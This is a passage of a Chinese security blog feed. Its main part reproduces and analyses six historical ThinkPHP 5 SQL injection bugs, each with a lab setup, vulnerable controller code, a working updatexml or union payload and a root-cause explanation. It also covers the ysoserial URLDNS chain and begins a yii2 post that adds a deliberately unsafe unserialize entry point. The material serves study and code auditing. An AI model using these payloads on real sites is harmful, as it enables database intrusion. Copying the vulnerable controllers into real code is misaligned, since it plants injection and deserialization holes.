src="https://gitee.com/lcdm123/image/raw/master/image-20211103234020569.png" alt="image-20211103234020569"></p><blockquote><p>上面的 handler 就是 URLStreamHandler</p></blockquote><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20211103234442107.png" alt="image-20211103234442107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003706260.png" alt="image-20211104003706260"></p><p>最后执行到 <code>getHostAddress()</code> 就调用到<code>getByName()</code>来根据主机名获取IP地址，在网络上就是执行一次 DNS 查询操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104000136774.png" alt="image-20211104000136774"></p><p>对于 ysoserial 的调用也是一样的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003402426.png" alt="image-20211104003402426"></p><p>ysoserial 为了防止在生成payload时执行URL请求和DNS查询，所以重写了一个 <code>SilentURLStreamHandler</code>类</p><h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><blockquote><p>明天来吧 有点困了，不划水了</p></blockquote><p>参考文章</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more">https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/#more</a></p><p><a href="https://su18.org/post/ysoserial-su18-1/">https://su18.org/post/ysoserial-su18-1/</a></p><p>P神代码审计</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ysoserial-URLDNS链分析&quot;&gt;&lt;a href=&quot;#Ysoserial-URLDNS链分析&quot; class=&quot;headerlink&quot; title=&quot;Ysoserial URLDNS链分析&quot;&gt;&lt;/a&gt;Ysoserial URLDNS链分析&lt;/h1&gt;&lt;p&gt;Ja</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Tp5 SQL注入</title>
    <link href="http://example.com/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-30T17:37:01.000Z</published>
    <updated>2021-10-30T17:38:04.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5"><a href="#ThinkPHP-5" class="headerlink" title="ThinkPHP 5"></a>ThinkPHP 5</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 5.0.24</p></blockquote><p>thinkphp5 与 thinkphp3 的区别</p><p><a href="https://cloud.tencent.com/developer/article/1135144">https://cloud.tencent.com/developer/article/1135144</a> </p><p><a href="https://blog.csdn.net/m0_37836194/article/details/89517379">https://blog.csdn.net/m0_37836194/article/details/89517379</a></p><p>目录结构</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001220058899.png" alt="image-20211001220058899"></p><p>程序的入口文件是在 <code>public/index.php</code> 然后加载 <code>thinkphp/start.php</code> 在 <code>thinkphp/base.php</code> 中定义了一些常量，做好准备工作后就会执行 <code>App::run()-&gt;send()</code> 启动框架</p><p>路由逻辑</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211002184117887.png" alt="image-20211002184117887"></p><blockquote><p>还存在一些其他的路由方法</p><p><a href="http://127.0.0.1/public/index.php/index/index/index2">http://127.0.0.1/public/index.php/index/index/index2</a></p></blockquote><p>大致的源码阅读已经有大佬写了文章，这里我就不再写了，直接看就好了</p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><h4 id="SQL1（insert）"><a href="#SQL1（insert）" class="headerlink" title="SQL1（insert）"></a>SQL1（insert）</h4><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.015 5.1.0&lt;=ThinkPHP&lt;=5.15</strong></p><p>环境的安装利用<code>composer</code></p><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// application/index/controller/Index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;insert(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;$username);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Update success&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create database tpdemo;<br>use tpdemo;<br>create table users(<br>id int primary key auto_increment,<br>username varchar(50) not null<br>);<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p><code>insert()</code>注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>: /public/index.php/index/index/index?username[<span class="hljs-number">0</span>]=inc&amp;username[<span class="hljs-number">1</span>]=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028232421470.png" alt="image-20211028232421470"></p><blockquote><p>需要再配置文件中开启调试功能，才会有报错回显</p></blockquote><p><strong>漏洞分析</strong></p><blockquote><p>漏洞分析的技巧可以对比官方更新文档来推测出漏洞点的位置</p></blockquote><p>直接寻找到 <code>insert()</code> 函数，<code>$username</code> 就是传入 <code>$data</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029000949504.png" alt="image-20211029000949504"></p><p><code>$data</code>是数组，所以执行后面的判断，这里的<code>inc</code> 和<code>dec</code> 都可以拿来注入，<code>exp</code>不行因为官方之前就有过滤了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029001626730.png" alt="image-20211029001626730"></p><p>这里的过滤把传入的一写危险单词给过滤了</p><p><img src="D:\markdown\image-20211029002700010.png" alt="image-20211029002700010"></p><p>最后将处理后的参数直接加入SQL语句这样就造成了注入</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51">https://mochazz.github.io/2019/03/20/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51</a></p><h4 id="SQL2（update）"><a href="#SQL2（update）" class="headerlink" title="SQL2（update）"></a>SQL2（update）</h4><p><strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.* <span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure><p>修改<code>composer.json</code> 文件中 ThinkPHP 的版本然后执行<code>composer update</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029163300310.png" alt="image-20211029163300310"></p><p>添加入口代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164350160.png" alt="image-20211029164350160"></p><p>开启debug模式不然报错注入没有回显，并且配置好框架数据库信息</p><p><strong>漏洞复现</strong></p><p>payload:<code>http://127.0.0.1/public/index.php/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&amp;username[3]=1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029164304431.png" alt="image-20211029164304431"></p><p><strong>漏洞分析</strong></p><p>直接根据 payload 来查看漏洞点，也可以查看官方的更新记录根据前后对比来发掘漏洞点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029170335139.png" alt="image-20211029170335139"></p><p>最终的 <code>update()</code> 函数是在<code>builder.php</code>中构建的 SQL 语句</p><p>最后的漏洞出现在<code>parseArrayData()</code>函数这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171046857.png" alt="image-20211029171046857"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029171704358.png" alt="image-20211029171704358"></p><p>这个函数的<code>list()</code>函数反向赋值有点没有看懂？？？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029172740053.png" alt="image-20211029172740053"></p><p>这里把传入的参数进行了拼接然后插入进了 SQL 语句中，并且没有经过任何过滤措施，就造成了SQL注入漏洞</p><h4 id="SQL3（select）"><a href="#SQL3（select）" class="headerlink" title="SQL3（select）"></a>SQL3（select）</h4><p>影响范围：ThinkPHP 全版本</p><p><strong>环境搭建</strong></p><p>直接利用上一个环境即可</p><p>入口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,$username)-&gt;select();<br>        <span class="hljs-keyword">return</span> $result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)--+</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029182836622.png" alt="image-20211029182836622"></p><p><strong>漏洞分析</strong></p><p>调试的时候直接在<code>Builder</code> 类<code>select()</code>处下断点，因为主要是在这里生成 SQL 语句</p><p>从 <code>select()</code> 中的 <code>parseWhere()</code> 到 <code>buildWhere()</code> 然后到 <code>parseWhereItem()</code> </p><p><code>parseWhereItem()</code>中是漏洞的主要点（记得好像 TP3 也有类似），获取到值输入的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029195319761.png" alt="image-20211029195319761"></p><p>这里循环检测<code>$exp</code>是否在<code>$parser</code>数组中，如果存在就进入执行拼接语句并且返回（未做任何过滤）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029194524372.png" alt="image-20211029194524372"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029193916454.png" alt="image-20211029193916454"></p><p>最后构成SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029200920783.png" alt="image-20211029200920783"></p><blockquote><p>分析得比较简略</p></blockquote><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81</a></p><h4 id="SQL4"><a href="#SQL4" class="headerlink" title="SQL4"></a>SQL4</h4><p>漏洞影响：<code>ThinkPHP=5.0.10</code></p><p><strong>环境搭建</strong></p><p><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $username = request()-&gt;get(<span class="hljs-string">&#x27;username/a&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();<br>        var_dump($result);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞复现</strong></p><p>payload: <code>http://127.0.0.1/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()--+ </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211029204945485.png" alt="image-20211029204945485"></p><p><strong>漏洞分析</strong></p><p>当数据传输给服务器时，不管使用哪种方法在 <code>ThinkPHP</code> 中都会经过 <code>Request</code> 类的 <code>input</code> 方法，这些数据都会被强制类型转换，并且经过 <code>filterValue</code> 方法的处理</p><p>注意这里的过滤虽然包含了 NOTLIKE 但是这里中间没有空格</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030001513315.png" alt="image-20211030001513315"></p><p>动态调试一下</p><p>这里直接跳过了，没有被过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030002532518.png" alt="image-20211030002532518"></p><p>之后的参数拼接，主要就是在<code>parseWhereItem()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030003754664.png" alt="image-20211030003754664"></p><p>这里就是利用payload中username需要传入二维数组的原因</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030004242391.png" alt="image-20211030004242391"></p><p>最后执行下来就会造成SQL注入了</p><p>这个漏洞只在 ThinkPHP 5.0.10中出现是因为之前的版本中默认不允许出现 not like。</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/</a></p><h4 id="SQL5-（order）"><a href="#SQL5-（order）" class="headerlink" title="SQL5 （order）"></a>SQL5 （order）</h4><p>影响版本：<code>5.1.16&lt;=ThinkPHP&lt;=5.1.22</code></p><p><strong>环境搭建</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5.</span>1.<span class="hljs-string">22</span><br></code></pre></td></tr></table></figure><p>然后修改<code>compose.json</code>更新一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $orderby = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>])-&gt;order($orderby)-&gt;find();<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>需注意的是 php 的版本问题</p></blockquote><p><strong>漏洞复现</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030201755912.png" alt="image-20211030201755912"></p><p><strong>漏洞分析</strong></p><blockquote><p>这个 payload 有点奇怪没有见过，是在键中的</p></blockquote><p>这个漏洞主要是由 <code>order</code> 引起的</p><p>传入的值会经过<code>Request</code>类中的<code>input()</code>函数，之后就会经过过滤函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211107424.png" alt="image-20211030211107424"></p><p>这里经过递归过滤但是这里的特殊的地方就是 payload 在键中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030211648109.png" alt="image-20211030211648109"></p><p>之后就进入查询，因为知道是 order 注入，所以这里直接跟进相关函数，调试时更进到 <code>parseOrder()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030223027240.png" alt="image-20211030223027240"></p><p>上面的<code>parseKey（）</code>使用给<code>$key</code>前后添加了反引号</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030224610437.png" alt="image-20211030224610437"></p><p>最后被拼接到了SQL语句中，造成了SQL注入</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211030234224569.png" alt="image-20211030234224569"></p><p>官方的修复方法是对变量就行了检查，判断是否存在<code>)</code> <code>#</code></p><p>参考文章</p><p><a href="https://blog.csdn.net/lyj20010728/article/details/119685805">https://blog.csdn.net/lyj20010728/article/details/119685805</a></p><p><a href="https://www.codetd.com/article/13124414">https://www.codetd.com/article/13124414</a></p><p><a href="https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://mochazz.github.io/2019/04/01/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><h4 id="SQL6"><a href="#SQL6" class="headerlink" title="SQL6"></a>SQL6</h4><p>影响版本</p><p><code>5.0.0&lt;=ThinkPHP&lt;=5.0.21</code></p><p><code>5.1.3&lt;=ThinkPHP&lt;=5.1.25</code></p><p><strong>环境配置</strong></p><p>还是利用上面的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $options = request()-&gt;get(<span class="hljs-string">&#x27;options&#x27;</span>);<br>        $result = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;max($options);<br>        var_dump($result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要开启 app_debug 和 app_trace</p><p><strong>漏洞复现</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/public/index.php/index/index/index?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031000952539.png" alt="image-20211031000952539"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031003033967.png" alt="image-20211031003033967"></p><p>不同版本的 payload 有一定的差别</p><blockquote><p>5.0.0~5.0.21、5.1.3～5.1.10: id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p>5.1.11～5.1.25: id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p></blockquote><p><strong>漏洞分析</strong></p><p>直接根据 payload 传入的位置分析</p><p>先是对输入的 payload 进行了一些处理，加上了括号和反引号，之后就会进入<code>select()</code> 函数去进行SQL语句的拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010520705.png" alt="image-20211031010520705"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010535400.png" alt="image-20211031010535400"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010558540.png" alt="image-20211031010558540"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010810261.png" alt="image-20211031010810261"></p><p>最后构造的结果是这个样</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031012135626.png" alt="image-20211031012135626"></p><p>官方的修复方法就是在<code>parseKey()</code>过滤了一些 字母 点号 星号 以外的字符</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/">https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个只是参考了别的大师傅的文章复现了一下SQL漏洞，主要是为了提升代码审计的能力也是为了能够了解ThinkPHP框架，并且在审计的过程中发现ThinkPHP的注入漏洞都在 Build 类中的方法。但是对于自己想挖这样的漏洞出来还是很不容易的…………继续学习吧希望有一天能够自己审计出一个0day。经过这几个漏洞的分析，框架的调试能力也熟练了许多。</p><p>参考文章</p><p><a href="https://mochazz.github.io/">https://mochazz.github.io/</a></p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><p><a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5&quot;&gt;&lt;a href=&quot;#ThinkPHP-5&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5&quot;&gt;&lt;/a&gt;ThinkPHP 5&lt;/h1&gt;&lt;h2 id=&quot;框架学习&quot;&gt;&lt;a href=&quot;#框架学习&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>yii2 反序列化POP链</title>
    <link href="http://example.com/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/"/>
    <id>http://example.com/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/</id>
    <published>2021-10-28T10:30:23.000Z</published>
    <updated>2021-10-28T10:33:25.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="yii2-反序列化漏洞"><a href="#yii2-反序列化漏洞" class="headerlink" title="yii2 反序列化漏洞"></a>yii2 反序列化漏洞</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>源码下载：<a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>在<code>config/web.php</code>中给<code>cookieValidationKey</code>配置添加一个密钥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027122133108.png" alt="image-20211027122133108"></p><p>写入一个反序列化入口</p><p><code>controllers/SerializeController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controllers</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializeController</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionSerialize</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> unserialize(base64_decode($data));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动框架 <code>php yii serve</code> 默认端口为 8080 可以通过 <code>--port=port</code> 更换端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123716179.png" alt="image-20211027123716179"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123846587.png" alt="image-20211027123846587"></p><p>使用手册帮助我们快速理解框架：<a href="https://www.kancloud.cn/manual/yii2-guide/69671">https://www.kancloud.cn/manual/yii2-guide/69671</a></p><p>路由访问方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131522065.png" alt="image-20211027131522065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131613252.png" alt="image-20211027131613252"></p><h2 id="反序列化漏洞"><a 